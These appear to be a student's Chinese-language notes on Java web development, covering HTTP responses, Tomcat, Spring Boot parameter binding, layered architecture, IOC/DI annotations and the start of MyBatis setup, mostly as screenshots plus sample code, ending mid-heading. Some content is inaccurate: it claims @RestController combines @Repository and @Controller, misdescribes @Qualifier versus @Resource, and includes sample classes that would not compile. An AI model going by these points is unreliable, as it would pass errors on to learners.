响应数据格式\n\n相应行,响应头,响应体/响应正文\n\n![image-20241125170308311](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170308311.png)\n\n### 状态码\n\n![image-20241125170408069](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170408069.png)\n\n![image-20241125170527857](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170527857.png)\n\n![image-20241125170725201](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170725201.png)\n\n最常见:![image-20241125170957970](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170957970.png)\n\n### 常见响应头\n\n![image-20241125171113513](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125171113513.png)\n\n# Web服务器-Tomcat\n\n![image-20250416211501889](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416211501889.png)\n\n## 基本使用\n\n![image-20241125174320885](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125174320885.png)\n\n![image-20250416212251052](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416212251052.png)\n\n### 端口冲突解决：\n\n![image-20241125173307496](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125173307496.png)\n\n## 程序解析\n\n![image-20250416212750472](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416212750472.png)\n\n创建springboot项目时要关联start.spring.io,所以创建时需要联网\n\n![image-20250416212848621](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416212848621.png)\n\n![image-20250416213051842](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416213051842.png)\n\n![image-20250416213101326](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416213101326.png)\n\n起步依赖的版本依赖于父工程,版本依赖于父工程版本\n\n![image-20250416213644225](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416213644225.png)\n\nSpring Boot-Web的maven依赖中已经内嵌了tomcat\n\n![image-20241125174015658](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125174015658.png)\n\n![image-20250416213330507](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416213330507.png)\n\n# 请求响应\n\n## 请求\n\n![image-20250416214125055](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416214125055.png)\n\nHttpServletRequest称为请求对象\n\nHttpServletResponse称为响应对象\n\n![image-20241204160223484](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204160223484.png)\n\nDispatcherServlet称为前端控制器/核心控制器\n\n![image-20241204160805640](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204160805640.png)\n\n### postman工具\n\n![image-20241204161524017](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204161524017.png)\n\n### 简单参数![image-20241204161631646](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204161631646.png)\n\n![image-20241204165153743](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204165153743.png) \n\n```java\npackage com.example.demo.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class RequestController {\n        @RequestMapping(\"/Args\")\n        //请求的参数名与接收参数名必须一致,不然接收到的就是null\n        public String RequestController(String name,String passwd){\n                String response = name+':'+passwd;\n                System.out.println(response);\n                return response;\n        }\n}\n```\n\n![image-20250416215444075](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416215444075.png)\n\n![image-20241204165500368](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204165500368.png)\n\n![image-20241204165558132](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204165558132.png)\n\n```java\npackage com.example.demo.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class RequestController {\n        @RequestMapping(\"/Args\")\n        //请求的参数名与接收参数名必须一致,不然接收到的就是null\n        public String RequestController(@RequestParam(name = \"name\",required = true)String name, @RequestParam(name = \"passwd\") String password){\n                String response = name+':'+password;\n                System.out.println(response);\n                return response;\n        }\n}\n```\n\n![image-20250416215756230](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416215756230.png)\n\n![image-20250416215819660](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416215819660.png)\n\n![image-20250416215852456](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416215852456.png)\n\n### 实体参数\n\n![image-20241204170401173](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241204170401173.png)\n\n实体都放在pojo下（自己建目录）\n\n![image-20250416220501221](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416220501221.png)\n\n![image-20250416220602362](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416220602362.png)\n\n至少要有请求参数\n\n![image-20250416220807637](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416220807637.png)\n\n```java\n@RequestMapping(\"/simplePojo\")\npublic String simplyPojo(User user){\n    System.out.println(user);\n    return \"OK\";\n}\n```\n\n![image-20250417190259676](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417190259676.png)\n\n如果改变参数名字就不能封装进去,参数值为null\n\n![image-20250417190352654](C:/Users/27251/Desktop/笔记/javaweb/image-20250417190352654.png)\n\n![image-20241204171709972](C:/Users/27251/Desktop/笔记/javaweb/image-20241204171709972.png)\n\n请求如下：\n\n**![image-20250417190905367](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417190905367.png)**\n\n\n\n![image-20250417191007007](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417191007007.png)\n\n![image-20250417191130946](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417191130946.png)\n\n![image-20250417191330869](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417191330869.png)\n\n![image-20250417191437056](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417191437056.png)控制台输出\n\n### 数组参数\n\n![image-20250416214712902](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416214712902.png)\n\n![image-20250417191956083](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417191956083.png)\n\n```java\n@RequestMapping(\"/arrayParam\")\npublic String arrayParam(String[] param){\n    System.out.println(Arrays.toString(param));\n    return \"OK\";\n}\n```\n\n![image-20250417192127800](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417192127800.png)\n\n### 集合参数\n\n![image-20250417192219602](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417192219602.png)\n\n不用@RequestParam会被解释成数组而非集合\n\n![image-20250417192522019](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417192522019.png)\n\n![image-20250417192553966](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417192553966.png)\n\n### 日期参数\n\n![image-20250417193302287](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417193302287.png)\n\n![image-20250417193712205](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417193712205.png)\n\n![image-20250417193742315](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417193742315.png)\n\n### json参数\n\n![image-20250417193843243](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417193843243.png)\n\npostman请求json参数方法：\n\n![image-20250417194252409](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417194252409.png)\n\nurl中要加上请求路径,否则报错\n\n![image-20250417194953911](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417194953911.png)\n\n键名与形参对象属性名相同\n\n![image-20250417194516998](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417194516998.png)\n\n使用@RequestBody标识\n\n```java\n @RequestMapping(\"/jsonParam\")\n        public String jsonParam(@RequestBody User user){\n                System.out.println(user);\n                return \"OK\";\n        }\n```\n\n![image-20250417195009225](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417195009225.png)\n\n### 路径参数\n\n#### 单个路径\n\n![image-20250417195216812](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417195216812.png)\n\n![image-20250417195556231](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417195556231.png)\n\n#### 多个路径\n\n![image-20250417195836541](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417195836541.png)\n\n## 响应\n\n### @ResponseBody注解\n\n![image-20250417200126906](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417200126906.png)\n\n#### 响应字符串\n\n```java\n@RequestMapping(\"/str\")\npublic String stringResponse() {\n    return \"Hello SpringBoot\";\n}\n```\n\n![image-20250417201221679](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417201221679.png)\n\n#### 响应对象\n\n响应格式为json\n\n```java\n@RequestMapping(\"/obj\")\npublic Address objResponse() {\n    Address address = new Address();\n    address.setProvince(\"福建\");\n    address.setCity(\"泉州\");\n    return address;\n}\n```\n\n![image-20250417201254954](C:/Users/27251/Desktop/笔记/javaweb/image-20250417201254954.png)\n\n#### 响应集合\n\n响应格式为json数组\n\n```java\n@RequestMapping(\"/List\")\npublic List<Address> listResponse() {\n    Address address = new Address();\n    address.setProvince(\"福建\");\n    address.setCity(\"泉州\");\n    Address address2 = new Address();\n    address2.setProvince(\"福建\");\n    address2.setCity(\"厦门\");\n\n    List<Address> list = new ArrayList<>();\n    list.add(address2);\n    list.add(address);\n\n    return list;\n}\n```\n\n![image-20250417201350422](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417201350422.png)\n\n#### 统一响应结果\n\n上面三种响应格式都不同,不便于前后端开发\n\n![image-20250417201534271](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417201534271.png)\n\n![image-20250417201653548](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417201653548.png)\n\n```java\npackage com.example.demo.POJO;\n\npublic class Result {\n        //响应码 success:0 error:-1\n        private Integer code;\n        //提示信息\n        private String msg;\n        //返回数据\n        private Object data;\n\n\n        public Result() {\n        }\n\n        public Result(Integer code, String msg, Object data) {\n                this.code = code;\n                this.msg = msg;\n                this.data = data;\n        }\n\n        public Integer getCode() {\n                return code;\n        }\n\n        public void setCode(Integer code) {\n                this.code = code;\n        }\n\n        public String getMsg() {\n                return msg;\n        }\n\n        public void setMsg(String msg) {\n                this.msg = msg;\n        }\n\n        public Object getData() {\n                return data;\n        }\n\n        public void setData(Object data) {\n                this.data = data;\n        }\n\n        @Override\n        public String toString() {\n                return \"Result{\" +\n                        \"code=\" + code +\n                        \", msg='\" + msg + '\\'' +\n                        \", data=\" + data +\n                        '}';\n        }\n        public static Result success(Object data){\n                return new Result(0,\"success\",data);\n        }\n        \n        public static Result success(){\n                return new Result(0,\"success\",null);\n        }\n        \n        public static Result error(String errMsg){\n                return new Result(-1,errMsg,null);\n        }\n}\n```\n\nstatic方法用于快速构建Result对象\n\n##### 响应字符串\n\n```java\n@RequestMapping(\"/str\")\npublic Result stringResponse() {\n    //return new Result(0,\"success\",\"Hello SpringBoot\");\n    return Result.success(\"Hello SpringBoot\");\n}\n```\n\n![image-20250417202949112](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417202949112.png)\n\n##### 响应对象\n\n响应格式为json\n\n```java\n@RequestMapping(\"/obj\")\npublic Result objResponse() {\n    Address address = new Address();\n    address.setProvince(\"福建\");\n    address.setCity(\"泉州\");\n    //return new Result(0,\"success\",address);\n    return Result.success(address);\n}\n```\n\n![image-20250417203015137](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417203015137.png)\n\n##### 响应集合\n\n响应格式为json数组\n\n```java\n@RequestMapping(\"/List\")\npublic Result listResponse() {\n    Address address = new Address();\n    address.setProvince(\"福建\");\n    address.setCity(\"泉州\");\n    Address address2 = new Address();\n    address2.setProvince(\"福建\");\n    address2.setCity(\"厦门\");\n\n    List<Address> list = new ArrayList<>();\n    list.add(address2);\n    list.add(address);\n\n    //return new Result(0,\"success\",list);\n    return Result.success(list);\n}\n```\n\n![image-20250417203041487](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417203041487.png)\n\n## 案例\n\n![image-20250417204553667](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417204553667.png)\n\n### pom.xml中添加坐标\n\n```xml\n<dependency>\n    <groupId>org.dom4j</groupId>\n    <artifactId>dom4j</artifactId>\n    <version>2.1.3</version>\n</dependency>\n```\n\n### 工具类XmlParserUtils\n\n![image-20250417204611577](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417204611577.png)\n\n```java\npackage com.example.demo.Utils;\n\nimport org.dom4j.Document;\nimport org.dom4j.DocumentException;\nimport org.dom4j.Element;\nimport org.dom4j.io.SAXReader;\n\nimport java.io.File;\nimport java.lang.reflect.Constructor;\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * XML解析工具类\n * 提供将XML文件解析为Java对象列表的功能\n */\npublic class XmlParserUtils {\n\n        /**\n         * 将XML文件解析为指定类型的对象列表\n         *\n         * @param file        XML文件路径\n         * @param targetClass 目标对象类型\n         * @param <T>         泛型类型\n         * @return 解析后的对象列表\n         * @throws DocumentException 如果XML解析失败\n         */\n        public static <T> List<T> parse(String file, Class<T> targetClass) throws DocumentException {\n                // 1. 创建SAXReader对象用于读取XML\n                SAXReader reader = new SAXReader();\n\n                // 2. 读取XML文件并获取Document对象\n                Document document = reader.read(new File(file));\n\n                // 3. 获取XML根元素\n                Element rootElement = document.getRootElement();\n\n                // 4. 获取所有emp元素\n                List<Element> elements = rootElement.elements(\"emp\");\n\n                // 5. 准备返回的结果列表\n                List<T> list = new ArrayList<>();\n\n                try {\n                        // 6. 遍历集合,得到每一个emp标签\n                        for (Element element : elements) {\n                                // 获取name属性\n                                String name = element.element(\"name\").getText();\n                                // 获取age属性\n                                String age = element.element(\"age\").getText();\n                                // 获取image属性\n                                String image = element.element(\"image\").getText();\n                                // 获取gender属性\n                                String gender = element.element(\"gender\").getText();\n                                // 获取job属性\n                                String job = element.element(\"job\").getText();\n\n                                // 7. 获取目标类的构造方法\n                                Constructor<T> constructor = targetClass.getDeclaredConstructor(\n                                        String.class, Integer.class, String.class, String.class, String.class\n                                );\n\n                                // 8. 设置构造方法可访问（即使是私有构造方法）\n                                constructor.setAccessible(true);\n\n                                // 9. 使用反射创建对象实例\n                                T object = constructor.newInstance(\n                                        name,\n                                        Integer.parseInt(age),\n                                        image,\n                                        gender,\n                                        job\n                                );\n\n                                // 10. 将创建的对象添加到列表\n                                list.add(object);\n                        }\n                } catch (Exception e) {\n                        throw new RuntimeException(\"XML解析为对象失败\", e);\n                }\n\n                return list;\n        }\n}\n```\n\n### Emp类\n\n```java\npublic class Emp {\n        private String name;\n        private Integer age;\n        private String image;\n        private String gender;\n        private String job;\n\n        public Emp() {\n        }\n\n        public Emp(String name, Integer age, String image, String gender, String job) {\n                this.name = name;\n                this.age = age;\n                this.image = image;\n                this.gender = gender;\n                this.job = job;\n        }\n\n        public String getName() {\n                return name;\n        }\n\n        public void setName(String name) {\n                this.name = name;\n        }\n\n        public Integer getAge() {\n                return age;\n        }\n\n        public void setAge(Integer age) {\n                this.age = age;\n        }\n\n        public String getImage() {\n                return image;\n        }\n\n        public void setImage(String image) {\n                this.image = image;\n        }\n\n        public String getGender() {\n                return gender;\n        }\n\n        public void setGender(String gender) {\n                this.gender = gender;\n        }\n\n        public String getJob() {\n                return job;\n        }\n\n        public void setJob(String job) {\n                this.job = job;\n        }\n}\n```\n\n### 处理请求类EmpController\n\n假设前端请求路径如下：\n\n![image-20250417212515559](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417212515559.png)\n\n那么@RequestMapping中的路径就为\"/listEmp\"\n\n```java\npackage com.example.demo.controller;\n\nimport com.example.demo.POJO.Emp;\nimport com.example.demo.POJO.Result;\nimport com.example.demo.Utils.XmlParserUtils;\nimport org.dom4j.DocumentException;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.util.List;\n\n@RestController\npublic class EmpController {\n        @RequestMapping(\"/listEmp\")\n        public Result list() throws DocumentException {\n                //1.加载并解析emp.xml\n                //动态加载xml文件\n                String file = this.getClass().getClassLoader().getResource(\"emp.xml\").getFile();\n                List<Emp> empList = XmlParserUtils.parse(file, Emp.class);\n                //2.对数据进行转换处理\n                //流式处理\n                empList.stream().forEach(emp -> {\n                        String gender = emp.getGender();\n                        if (\"1\".equals(gender)) {\n                                emp.setGender(\"男\");\n                        } else if (\"2\".equals(gender)) {\n                                emp.setGender(\"女\");\n                        }\n                        String job = emp.getJob();\n                        if (\"1\".equals(job)) {\n                                emp.setJob(\"老师\");\n                        } else if (\"2\".equals(job)) {\n                                emp.setJob(\"主任\");\n                        }else if(\"3\".equals(job)){\n                                emp.setJob(\"就业指导\");\n                        }\n                });\n                //3.响应数据\n                return Result.success(empList);\n        }\n}\n\n```\n\n响应结果：\n\n![image-20250417213927717](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417213927717.png)\n\n# 分层解耦\n\n## 三层架构\n\n![image-20250417210400405](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417210400405.png)\n\n![image-20250417210427254](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417210427254.png)\n\n![image-20250417210517928](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417210517928.png)\n\n### Dao层-数据访问\n\nDao对数据的访问方式很多（文件,数据库等）,想要灵活处理需要使用接口\n\n![image-20250417214158607](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417214158607.png)\n\n```java\npackage com.example.demo.Dao;\n\nimport com.example.demo.POJO.Emp;\n\nimport java.util.List;\n\npublic interface EmpDao {\n        //获取员工列表\n        public List<Emp> getListEmp();\n}\n```\n\n它的实现类A：\n\n![image-20250417214439110](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417214439110.png)\n\n```java\npackage com.example.demo.Dao.impl;\n\nimport com.example.demo.Dao.EmpDao;\nimport com.example.demo.POJO.Emp;\nimport com.example.demo.Utils.XmlParserUtils;\nimport org.dom4j.DocumentException;\n\nimport java.util.List;\n\npublic class EmpDaoA implements EmpDao {\n        @Override\n        public List<Emp> getListEmp() throws DocumentException {\n                //1.加载并解析emp.xml\n                //动态加载xml文件\n                String file = this.getClass().getClassLoader().getResource(\"emp.xml\").getFile();\n                return XmlParserUtils.parse(file, Emp.class);\n        }\n}\n```\n\n### Service层-业务逻辑处理\n\n与Dao层类似,想要灵活处理,使用接口\n\n![image-20250417214923497](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417214923497.png)\n\n```java\npackage com.example.demo.service;\n\nimport com.example.demo.POJO.Emp;\n\nimport java.util.List;\n\npublic interface EmpService {\n        //返回处理后的emp列表\n        public List<Emp> ListEmp();\n}\n```\n\n它的实现类：\n\n要处理数据,需要从Dao层获取,那么需要定义Dao对象\n\n```java\npackage com.example.demo.service.impl;\n\nimport com.example.demo.Dao.EmpDao;\nimport com.example.demo.Dao.impl.EmpDaoA;\nimport com.example.demo.POJO.Emp;\nimport com.example.demo.service.EmpService;\nimport org.dom4j.DocumentException;\n\nimport java.util.List;\n\npublic class EmpServiceA implements EmpService {\n        //面向接口编程\n        private EmpDao empDao = new EmpDaoA();\n\n        @Override\n        public List<Emp> ListEmp() throws DocumentException {\n                List<Emp> empList = empDao.getListEmp();\n                empList.stream().forEach(emp -> {\n                        String gender = emp.getGender();\n                        if (\"1\".equals(gender)) {\n                                emp.setGender(\"男\");\n                        } else if (\"2\".equals(gender)) {\n                                emp.setGender(\"女\");\n                        }\n                        String job = emp.getJob();\n                        if (\"1\".equals(job)) {\n                                emp.setJob(\"老师\");\n                        } else if (\"2\".equals(job)) {\n                                emp.setJob(\"主任\");\n                        } else if (\"3\".equals(job)) {\n                                emp.setJob(\"就业指导\");\n                        }\n                });\n                \n                return empList;\n        }\n}\n```\n\n### Controller层-接收请求,响应数据\n\n需要调底下1层的接口\n\n```java\npackage com.example.demo.controller;\n\nimport com.example.demo.Dao.EmpDao;\nimport com.example.demo.POJO.Emp;\nimport com.example.demo.POJO.Result;\nimport com.example.demo.Utils.XmlParserUtils;\nimport com.example.demo.service.EmpService;\nimport com.example.demo.service.impl.EmpServiceA;\nimport org.dom4j.DocumentException;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.util.List;\n\n@RestController\npublic class EmpController {\n        private EmpService empService = new EmpServiceA();\n        @RequestMapping(\"/listEmp\")\n        public Result list() throws DocumentException {\n                //1.加载并解析emp.xml\n                //2.对数据进行转换处理\n                List<Emp> empList = empService.ListEmp();\n                //3.响应数据\n                return Result.success(empList);\n        }\n}\n```\n\n![image-20250417215752235](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417215752235.png)\n\n## 分层解耦\n\n![image-20250417220049558](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417220049558.png)\n\nEmpController中的empService是Service层实现类的实例,说明这两层耦合\n\n解决方法：容器\n\n![image-20250417220320616](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417220320616.png) \n\n![image-20250417220343493](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417220343493.png)\n\n  ![image-20250417220457909](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417220457909.png)\n\n### 步骤\n\n![image-20250418201847743](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418201847743.png)\n\n### @Component注解\n\n在Dao层、Service实现类前加上该注解,表示将该类交给IOC容器管理,成为IOC容器中的bean\n\n这样一来Controller层想要切换底层,直接更改@Component作用的类就行\n\n```java\n@Component\npublic class EmpDaoA implements EmpDao {\n        @Override\n        public List<Emp> getListEmp() throws DocumentException {\n                //1.加载并解析emp.xml\n                //动态加载xml文件\n                String file = this.getClass().getClassLoader().getResource(\"emp.xml\").getFile();\n                return XmlParserUtils.parse(file, Emp.class);\n        }\n}\n```\n\n\n\n### @Autowired注解\n\n运行时,IOC容器会提供该类型的bean对象,并赋值给该变量 - 依赖注入\n\n```java\n@RestController\npublic class EmpController {\n        @Autowired\n        private EmpService empService;\n        @RequestMapping(\"/listEmp\")\n        public Result list() throws DocumentException {\n                //1.加载并解析emp.xml\n                //2.对数据进行转换处理\n                List<Emp> empList = empService.ListEmp();\n                //3.响应数据\n                return Result.success(empList);\n        }\n}\n```\n\n## IOC详解\n\n### Bean的声明\n\n![image-20250418203528345](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418203528345.png)\n\nController层不用再加@Controller,因为@RestController=@Repository+@Controller\n\n![image-20250418203737224](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418203737224.png)\n\n为什么称之为@Component的衍生类？\n\n\n\n![image-20250418204430796](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418204430796.png)\n\n![image-20250418204407308](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418204407308.png)\n\n```java\n//可以以这样的形式为Bean对象起名字\n@Service(\"Name\")\n```\n\n### 注意事项\n\n![image-20250418204546486](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418204546486.png)\n\n### Bean组件扫描\n\n![image-20250418204842261](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418204842261.png)\n\n规范：将Dao放在启动类所在包\n\n不规范：找不到包\n\n![image-20250418205159062](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418205159062.png)\n\n就需要在启动类上使用@ComponentScan\n\n![image-20250418205005662](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418205005662.png)\n\n源码显示,@ComponentScan需要接受String数组作为所在包\n\n```java\npackage com.example.demo;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.ComponentScan;\n\n@ComponentScan({\"Dao\",\"com.example.demo\"})\n@SpringBootApplication\npublic class DemoApplication {\n\n        public static void main(String[] args) {\n                SpringApplication.run(DemoApplication.class, args);\n        }\n\n}\n```\n\n我们为什么数组中传入两个包呢？\n\n@SpringBootApplication中集成的@ComponentScan扫描的是启动类所在的包；\n\n在@ComponentScan中声明其他的包会覆盖掉启动类所在的包,所以需要重新声明启动类所在的包\n\n## DI详解\n\n如果有多个相同类型的Bean：\n\n![image-20250418211728937](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211728937.png)\n\n![image-20250418211743623](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211743623.png)\n\n![image-20250418211703044](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211703044.png)\n\n![image-20250418211232732](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211232732.png)\n\n### @Primary\n\n多个相同类型的Bean,加上@Primary的那个生效\n\n![image-20250418211916896](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211916896.png)\n\n![image-20250418211907939](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211907939.png)\n\n![image-20250418212004613](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418212004613.png)\n\n![image-20250418211955691](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418211955691.png)\n\n### @Qualifier\n\n在@AutoWired前加上@Qualifier(\"Bean名字\")\n\n```java\npackage com.example.demo.controller;\n\nimport com.example.demo.POJO.Emp;\nimport com.example.demo.POJO.Result;\nimport com.example.demo.service.EmpService;\nimport org.dom4j.DocumentException;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.util.List;\n\n@RestController\npublic class EmpController {\n    \t//EmpServiceA默认的bean名字\n        @Qualifier(\"empServiceA\")\n        @Autowired\n        private EmpService empService;\n        @RequestMapping(\"/listEmp\")\n        public Result list() throws DocumentException {\n                //1.加载并解析emp.xml\n                //2.对数据进行转换处理\n                List<Emp> empList = empService.ListEmp();\n                //3.响应数据\n                return Result.success(empList);\n        }\n}\n```\n\n### @Resource\n\n与@Qualifier的区别：\n\n- @Qualifier按照类型注入\n\n- @Resource按照名称注入;使用@Resource后就不用@Autowired了\n\n    ```java\n    package com.example.demo.controller;\n    \n    import com.example.demo.POJO.Emp;\n    import com.example.demo.POJO.Result;\n    import com.example.demo.service.EmpService;\n    import jakarta.annotation.Resource;\n    import org.dom4j.DocumentException;\n    import org.springframework.beans.factory.annotation.Autowired;\n    import org.springframework.beans.factory.annotation.Qualifier;\n    import org.springframework.web.bind.annotation.RequestMapping;\n    import org.springframework.web.bind.annotation.RestController;\n    \n    import java.util.List;\n    \n    @RestController\n    public class EmpController {\n    //        @Qualifier(\"empServiceA\")\n    //        @Autowired\n            @Resource(name = \"empServiceB\")\n            private EmpService empService;\n            @RequestMapping(\"/listEmp\")\n            public Result list() throws DocumentException {\n                    //1.加载并解析emp.xml\n                    //2.对数据进行转换处理\n                    List<Emp> empList = empService.ListEmp();\n                    //3.响应数据\n                    return Result.success(empList);\n            }\n    }\n    ```\n\n    \n\n<img src=\"C:\\Users\\27251\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250418212814266.png\" alt=\"image-20250418212814266\" style=\"zoom:40%;\" />\n\n# Mybatis\n\n![image-20250418213624926](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418213624926.png)\n\n## 准备工作\n\n![image-20250418213948765](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418213948765.png)\n\n![image-20250420162905928](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420162905928.png)\n\n![image-20250420163058104](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420163058104.png)\n\n![image-20250420163042923](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250420163042923.png)\n\n### springboot工程\n\n![image-20250418214309975](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250418214309975.png)\n\n![image-20250418214350129](C:/Users/27251/Desktop/笔记/javaweb/image-20250418214350129.png)\n\n### 配置文件\n\n```properties\nspring.application.name=Mybatis-demo\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n#数据库名\nspring.datasource.url=jdbc:mysql://localhost:3306/mybatis\n#用户名\nspring.datasource.username=root\n#密码\nspring.datasource.password=114514\n```\n\n### @Mapper注解\n\nMybatis中Mapper层其实就和Dao层差不多\n\n在运行时，会自动生成该接口的实现类对象（代理对象），并且将该对象交给IOC容器管理\n\n```java\npackage com.wwwtty.mybatisdemo.mapper;\n\nimport com.wwwtty.mybatisdemo.pojo.User;\nimport org.apache.ibatis.annotations.Mapper;\nimport org.apache.ibatis.annotations.Select;\n\nimport java.util.List;\n\n@Mapper\npublic interface UserMapper {\n        @Select(\"select* from user\")\n        public List<User> list();\n}\n```\n\n### 